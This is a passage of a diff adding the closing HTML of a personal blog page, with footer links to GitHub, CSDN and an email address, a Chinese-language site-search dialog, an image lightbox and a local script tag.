+    <a href="https://github.com/xyaxxya" aria-label="GitHub" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="18" r="3"></circle><circle cx="6" cy="6" r="3"></circle><circle cx="18" cy="6" r="3"></circle><path d="M18 9v2c0 .6-.4 1-1 1H7c-.6 0-1-.4-1-1V9"></path><path d="M12 12v3"></path></svg></a>
+    <a href="https://blog.csdn.net/xydsg" aria-label="CSDN" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4"></path><path d="M2 6h4"></path><path d="M2 10h4"></path><path d="M2 14h4"></path><path d="M2 18h4"></path><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"></path></svg></a>
+    <a href="mailto:3170234809@qq.com" aria-label="Email"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"></path><rect x="2" y="4" width="20" height="16" rx="2"></rect></svg></a></div>
+    </div>
+    
+    <dialog class="search-dialog" data-search-dialog>
+      <div class="search-shell">
+        <header class="search-header">
+          <span class="search-title">站内搜索</span>
+          <button class="icon-button" type="button" data-close-search aria-label="关闭搜索"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
+        </header>
+        <label class="search-field">
+          <svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m21 21-4.34-4.34"></path><circle cx="11" cy="11" r="8"></circle></svg>
+          <input type="search" data-search-input autocomplete="off" placeholder="搜索标题、标签或正文" aria-label="搜索文章">
+        </label>
+        <p class="search-status" data-search-status>输入关键词，查找 39 篇记录。</p>
+        <div class="search-results" data-search-results aria-live="polite"></div>
+        <template data-search-result-icon><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></template>
+      </div>
+    </dialog>
+    
+    <dialog class="image-lightbox" data-image-lightbox>
+      <button class="icon-button lightbox-close" type="button" data-lightbox-close aria-label="关闭图片预览"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
+      <img data-lightbox-image alt="">
+      <p data-lightbox-caption></p>
+    </dialog>
+    <script src="/assets/app.js" defer></script>
+  </body>
+</html>
